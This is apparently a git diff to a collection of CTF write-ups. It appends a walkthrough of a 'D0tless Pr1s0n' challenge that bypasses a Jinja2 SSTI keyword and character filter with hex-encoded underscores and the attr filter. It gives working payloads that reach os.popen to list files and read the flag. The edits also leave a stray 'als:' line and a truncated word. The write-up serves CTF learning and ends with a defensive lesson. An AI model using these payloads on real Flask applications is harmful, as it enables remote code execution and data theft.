@@ -156,6 +156,7 @@ curl [http://nightmare.offgrayeg.com](http://nightmare.offgrayeg.com):7878/flag
 ![Flag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/Soda3/Flag.png)
 
 The Flag: N!ghtM4re{H34D_Req_Ar3_N0t_Alw4ys_S4f3!!}
+als:
 
 ---
 
@@ -186,8 +187,7 @@ It seems like a straightforward user registration flow, but in CTFs, the simples
 * * *
 ### 🔍 Stage 1: The Coffee Break (Reconnaissance)
 
-I started by following the application's instructions and proceeded to the **Register** page. I created a standard account with the following credentials:
-
+I started by following the application's instructions and proceeded to the **Register** page. I created a standard account with the following credenti
 - **Username:** `0xaskar`
 - **Password:** `0xaskar`
 
@@ -246,3 +246,121 @@ After updating the cookie, I navigated to the /flag endpoint. The server, now co
 ![Flag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/7ru57%20155u35/Flag.png)
 
 The Flag: `N!ghtM4re{jw7_0r_fl45k_1_d0n7_c4r3!!}`
+
+---
+
+## 🚩 4. Challenge Write-up: D0tless Pr1s0n
+=========================================
+
+### 🛠️ General Information
+
+*   **Challenge Name:** D0tless Pr1s0n
+    
+*   **Difficulty:** Hard
+        
+*   **Author:** [0xaskar](https://www.linkedin.com/in/abdelrahmanaskar10/)
+        
+* * *
+
+### 📜 The Description
+
+> _"In a world of dots and lines, I am the one who holds the eraser. You don't play against the code, you play against 0xaskar."_
+
+![Challenge](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/D0tless%20Pr1s0n/Challenge.png)
+
+The challenge greets us with a "Secure Card Generator System." It asks for a **Subject Name** and a **Designation**. On the surface, it looks like a simple utility to generate identity cards.
+
+![Ostor](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/D0tless%20Pr1s0n/Ostor.png)
+
+* * *
+
+### 🔍 Stage 1: The Secure Card (Reconnaissance)
+
+I started by entering some basic information:
+
+- **Subject Name:** `0xaskar`
+- **Designation:** `Stalker`
+
+![Card1](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/D0tless%20Pr1s0n/Card1.png)
+
+The system generated a card as expected. Given that the input is being reflected on the card, the first thing that comes to mind in a web challenge is **Server-Side Template Injection (SSTI)**.
+
+* * *
+
+### 🕵️ Stage 2: Probing the Walls (Filter Identification)
+
+To confirm SSTI and identify the template engine, I tried several payloads in the "Designation" field.
+The payload `{{7*7}}` was evaluated and returned `49`, confirming that the application is using the **Jinja2** (Python) template engine.
+
+However, as soon as I tried to escalate my probes, I hit a wall.
+
+* * *
+
+### 🧱 Stage 3: The Restricted Zone (Detection Escalation)
+
+The application had a robust detection system. Whenever I used common SSTI keywords or characters, I received a strict alert:
+
+> **SYSTEM ALERT: 0xaskar says: 🛑 Nice try! (Detected: '_', 'mro', 'base')**
+
+![Detection](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/D0tless%20Pr1s0n/Detection.png)
+
+After further testing, I compiled a list of forbidden elements:
+- `_` (Underscore)
+- `.` (Dot)
+- `[` and `]` (Brackets)
+- Keywords: `mro`, `base`, `class`, `subclasses`, `globals`, etc.
+
+![Keywords](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/D0tless%20Pr1s0n/Keywords.png)
+
+* * *
+
+### 🔓 Stage 4: Shattering the Dots (SSTI Bypass Strategy)
+
+To bypass these filters, I needed a way to access object attributes without using the restricted characters.
+
+1.  **Hex Encoding for Characters:**
+    I replaced the `.` with its hex equivalent `\x2e` and the `_` with `\x5f`.
+    Example: `self\x2e\x5f\x5finit\x5f\x5f` instead of `self.__init__`.
+
+2.  **Using the `attr` Filter:**
+    Since dots `.` were blocked, I used Jinja2's `attr` filter to access attributes. Instead of `obj.attribute`, I used `obj|attr('attribute')`.
+
+3.  **Using `request` Object:**
+    The `request` object is often available in Flask templates and can be used as a starting point to reach the `application` and its `globals`.
+
+Combining these techniques, I could craft a payload that avoided all detections:
+`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')}}`
+
+* * *
+
+### 💥 Stage 5: Prison Break (Executing RCE)
+
+Now that I could access `builtins`, I could import the `os` module to achieve **Remote Code Execution (RCE)**. I used `popen` to execute system commands.
+
+**RCE Payload (to list files):**
+```jinja2
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
+```
+
+![RCE](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/D0tless%20Pr1s0n/Rce.png)
+
+* * *
+
+### 🏆 Stage 6: Capturing the Flag
+
+The final step was to read the flag. I used `cat flag.txt`, but remembering to bypass the dot in the filename using `\x2e`.
+
+**Final Payload:**
+```jinja2
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag\x2etxt')|attr('read')()}}
+```
+
+![Flag](https://raw.githubusercontent.com/AbdelruhmanAskar/0/refs/heads/master/assets/images/D0tless%20Pr1s0n/Flag.png)
+
+**The Flag:** `N!ghtM4re{0xAsk4r_Is_W4tching_U_SST1ing_My_Server_Bruh}`
+
+* * *
+
+### 💡 Lesson Learned
+
+This challenge is a masterclass in **SSTI filter bypass**. It teaches us that blacklisting characters like dots and underscores is not a sufficient defense. By using alternative attribute access methods (like `attr`) and character encoding (hex), an attacker can still navigate the Python object hierarchy. The only true defense is to avoid passing user-controlled input directly into template evaluation or to use a highly restricted sandbox environment.
